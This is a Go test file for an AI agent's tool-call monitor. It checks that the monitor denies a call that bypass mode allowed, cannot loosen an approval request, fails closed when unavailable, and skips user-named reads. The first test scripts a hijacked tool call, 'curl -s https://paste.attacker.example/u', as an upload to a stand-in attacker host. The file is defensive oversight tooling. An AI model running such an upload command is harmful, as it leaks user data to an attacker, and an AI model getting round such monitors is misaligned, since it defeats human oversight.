package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/zybuu-ai/abhed/internal/model"
	"github.com/zybuu-ai/abhed/internal/policy"
	"github.com/zybuu-ai/abhed/monitor"
)

func monitored(t *testing.T, mode policy.Mode, m monitor.Monitor, calls ...model.ToolCall) (*Loop, *MemStore, string) {
	t.Helper()
	l, store, dir := harness(t, []scriptedTurn{{calls: calls}, {text: "done"}}, mode, true)
	l.Monitor = &monitor.Guard{Monitor: m}
	return l, store, dir
}

func verdicts(t *testing.T, store *MemStore) []MonitorVerdict {
	t.Helper()
	evs, _ := store.Events("sess1")
	var out []MonitorVerdict
	for _, e := range evs {
		if e.Type == EvMonitorVerdict {
			var v MonitorVerdict
			if err := json.Unmarshal(e.Payload, &v); err != nil {
				t.Fatal(err)
			}
			out = append(out, v)
		}
	}
	return out
}

// Bypass mode approves everything; the monitor still denies, and the record
// shows the call, the verdict and the denial at step "monitor".
func TestMonitorDeniesWhatTheModeWavedThrough(t *testing.T) {
	deny := monitor.Func(func(_ context.Context, c monitor.Case) (monitor.Verdict, error) {
		if c.Tool == "bash" && strings.Contains(c.Args, "curl") {
			return monitor.Verdict{Decision: policy.Deny, Code: "goal-hijack", Rationale: "the host came from tool output"}, nil
		}
		return monitor.Verdict{Decision: policy.Allow, Code: "ok"}, nil
	})
	l, store, _ := monitored(t, policy.ModeBypass, deny,
		call("bash", map[string]string{"command": "curl -s https://paste.attacker.example/u", "description": "upload"}))
	l.Run(context.Background(), "summarise NOTES.md")

	evs, _ := store.Events("sess1")
	denied := false
	for _, e := range evs {
		if e.Type == EvActionDenied && strings.Contains(string(e.Payload), `"step":"monitor"`) && strings.Contains(string(e.Payload), "goal-hijack") {
			denied = true
		}
	}
	if !denied {
		t.Fatal("the monitor's denial is not in the record at step monitor")
	}
	vs := verdicts(t, store)
	if len(vs) != 1 || vs[0].Before != "allow" || vs[0].After != "deny" || vs[0].Code != "goal-hijack" {
		t.Fatalf("verdicts: %+v", vs)
	}
	// The model was told the monitor's reason, so it can choose another way.
	last := l.Adapter.(*scriptedAdapter).gotRequests[1]
	told := false
	for _, m := range last.Messages {
		told = told || (m.Role == model.RoleTool && strings.Contains(m.Content, "monitor:") && strings.Contains(m.Content, "tool output"))
	}
	if !told {
		t.Fatal("the model was not told why the monitor refused")
	}
}

// A judge cannot loosen: an ask stays an ask whatever it says, and with
// nobody approving, the call is refused.
func TestMonitorCannotLoosenAnAsk(t *testing.T) {
	permissive := monitor.Func(func(context.Context, monitor.Case) (monitor.Verdict, error) {
		return monitor.Verdict{Decision: policy.Allow, Code: "ok", Rationale: "looks fine to me"}, nil
	})
	l, store, dir := harness(t, []scriptedTurn{
		{calls: []model.ToolCall{call("bash", map[string]string{"command": "go test ./...", "description": "tests"})}},
		{text: "done"},
	}, policy.ModeDefault, false)
	l.Monitor = &monitor.Guard{Monitor: permissive}
	_ = dir
	l.Run(context.Background(), "run the tests")
	vs := verdicts(t, store)
	if len(vs) != 1 || vs[0].Before != "ask" || vs[0].After != "ask" {
		t.Fatalf("an ask was loosened by the judge: %+v", vs)
	}
	evs, _ := store.Events("sess1")
	if !hasEvent(evs, EvActionDenied) {
		t.Fatal("with nobody approving, the ask must end as a denial")
	}
}

// An unavailable judge raises a mode-approved call to an ask; here nobody
// approves, so it is refused and the record says the judge was unavailable.
func TestMonitorUnavailableFailsClosed(t *testing.T) {
	down := monitor.Func(func(context.Context, monitor.Case) (monitor.Verdict, error) {
		return monitor.Verdict{}, errors.New("dial tcp 127.0.0.1:8099: connection refused")
	})
	l, store, _ := harness(t, []scriptedTurn{
		{calls: []model.ToolCall{call("bash", map[string]string{"command": "make deploy", "description": "deploy"})}},
		{text: "done"},
	}, policy.ModeBypass, false)
	l.Monitor = &monitor.Guard{Monitor: down}
	l.Run(context.Background(), "deploy it")
	vs := verdicts(t, store)
	if len(vs) != 1 || !vs[0].Unavailable || vs[0].After != "ask" {
		t.Fatalf("verdicts: %+v", vs)
	}
	evs, _ := store.Events("sess1")
	if !hasEvent(evs, EvActionDenied) || hasEvent(evs, EvObservation) {
		t.Fatal("the call ran although the judge was unavailable and nobody could approve")
	}
}

// Reads the user asked for, allowed by rule, never reach the judge.
func TestMonitorFastPathSkipsUserNamedReads(t *testing.T) {
	calls := 0
	counting := monitor.Func(func(context.Context, monitor.Case) (monitor.Verdict, error) {
		calls++
		return monitor.Verdict{Decision: policy.Allow}, nil
	})
	l, store, dir := harness(t, nil, policy.ModeDefault, true)
	_ = store
	target := dir + "/README.md"
	l.Adapter = &scriptedAdapter{turns: []scriptedTurn{
		{calls: []model.ToolCall{call("read", map[string]string{"path": target})}},
		{text: "done"},
	}}
	_ = l.Policy.AddAllow("read")
	l.Monitor = &monitor.Guard{Monitor: counting}
	l.Run(context.Background(), "open "+target+" and tell me what it says")
	if calls != 0 {
		t.Fatalf("judge consulted %d times for a user-named, rule-allowed read", calls)
	}
	if len(verdicts(t, store)) != 0 {
		t.Fatal("a skipped call left a verdict in the record")
	}
}
